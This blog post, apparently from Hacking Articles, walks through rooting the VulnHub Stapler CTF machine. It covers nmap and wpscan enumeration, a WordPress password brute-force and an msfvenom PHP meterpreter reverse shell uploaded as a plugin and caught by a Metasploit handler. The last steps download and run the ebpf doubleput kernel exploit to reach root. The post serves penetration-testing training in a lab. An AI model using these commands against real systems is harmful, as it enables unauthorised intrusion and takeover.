@@ -1,0 +1,447 @@
+
+								
+																		Hack the Stapler VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 31, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									In this article, we will try to attack and gain root access to the Stapler: 1 challenge from VulnHub. The goal is to reconnaissance, enumeration, and exploits this vulnerable machine to get root access and to read the contents of flag.txt. We have been told that are various methods to do so but we have tried and found the simplest way.
+Download the stapler VM from here
+Penetrating Methodology:
+
+Network Scanning (Nmap, netdiscover)
+Enumeration (robot.txt)
+WordPress scanning &amp; password cracking (wpscan)
+Login into WordPress
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Import python one-liner for proper TTY shell
+Kernel privilege escalation
+Get Root access and capture the flag.
+
+Start off with scanning the network to find our target. And we all the command for it is:
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+We found our target –&gt; 192.168.1.126
+
+To scan our target IP we will use aggressive scan (-A)
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.126
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.126
+					
+				
+			
+		
+
+
+The result will show us that port number 21, 22, 53, 80, 137, 139, and so many other ports are open.
+
+Also tell us about robot.txt 2 disallowed entries i.e. /admin112233 and /blogblog. Then we explored target IP over port 80 but didn’t found anything here.
+
+So we tried opening it in the browser with port 12380
+
+We open /blogblog/ but here also didn’t find any clue for the next step.
+
+Then we thought to explore https://192.168.1.126:12380/blogblog/ which put up a new web page as shown below. Studying this blog we have established that the blog is made of Word Press. Now obviously use WPScan to know all about the blog. 
+
+To apply wpscan we have come up with a 3-in-1 command as it will tell us all about the theme and plug-ins as well as usernames and the command is:
+
+		
+		
+			
+			
+			
+			
+wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
+			
+				
+					
+				
+					1
+				
+						wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
+					
+				
+			
+		
+
+
+It has dumped all username for login, now we only need a password for login into WordPress.
+
+By executing below command you will get a password for John.
+
+		
+		
+			
+			
+			
+			
+wpscan -u https://192.168.1.126/blogblog/ --username John --wordlist /usr/share/wordlists/rockyou.txt
+			
+				
+					
+				
+					1
+				
+						wpscan -u https://192.168.1.126/blogblog/ --username John --wordlist /usr/share/wordlists/rockyou.txt
+					
+				
+			
+		
+
+As you can see the password is “incorrect” for user “john”; now use these credential for login into WordPress.
+
+As we logged in, all now we have to do is to create our PHP code to upload so that once the code will execute we will have its session. To generate the code type:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.1.132 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.1.132 lport=4444 -f raw
+					
+				
+			
+		
+
+On the other hand run multi/handler inside Metasploit framework.
+
+Copy the code from &lt;?php to die() and save it in a file with .php extension.
+Now, as we already logged on, go to plugins option then select add plugin option. Click on browse option and select the PHP in which you have just saved the code and click on OK.
+
+Now go to the upload directory and double click on the shell.php which you just uploaded.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.132
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.132msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe Meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Further type:
+sysinfo
+Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+lsb_release -a
+			
+				
+					
+				
+					123
+				
+						shellpython -c 'import pty;pty.spawn("/bin/bash")'lsb_release -a
+					
+				
+			
+		
+
+
+We now know that our target is using Ubuntu 16.04 so we will try and search its exploit on exploit-db.com. Our search is successful and we have found our appropriate exploit as shown below:
+
+Now, we need to go into the desired writable file and for that type:
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+			
+				
+					
+				
+					1
+				
+						cd /tmp
+					
+				
+			
+		
+
+And then to download the exploit type:
+
+		
+		
+			
+			
+			
+			
+wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+			
+				
+					
+				
+					1
+				
+						wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+					
+				
+			
+		
+
+
+When we download the exploit, zip files are downloaded and now unzip it and for that type:
+
+		
+		
+			
+			
+			
+			
+unzip 39772.zip
+			
+				
+					
+				
+					1
+				
+						unzip 39772.zip
+					
+				
+			
+		
+
+Open the unzipped file by typing:
+
+		
+		
+			
+			
+			
+			
+ls
+cd 39772
+			
+				
+					
+				
+					12
+				
+						lscd 39772
+					
+				
+			
+		
+
+Now we have a tar file named exploit.tar. Open it with the following command:
+
+		
+		
+			
+			
+			
+			
+tar -xvf exploit.tar
+			
+				
+					
+				
+					1
+				
+						tar -xvf exploit.tar
+					
+				
+			
+		
+
+
+Now use the ls command to view the directories. Now we will go into the double put-exploit folder and for that type:
+
+		
+		
+			
+			
+			
+			
+cd ebpf_mapfd_doubleput_exploit
+ls 
+./compile.sh (will run the compile.sh)
+./doubleput (will run the double.sh)
+			
+				
+					
+				
+					1234
+				
+						cd ebpf_mapfd_doubleput_exploitls ./compile.sh (will run the compile.sh)./doubleput (will run the double.sh)
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat flag.txt
+					
+				
+			
+		
+
+Note: This lab can be solved in multiple ways because there is more than one method to hack this lab.
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
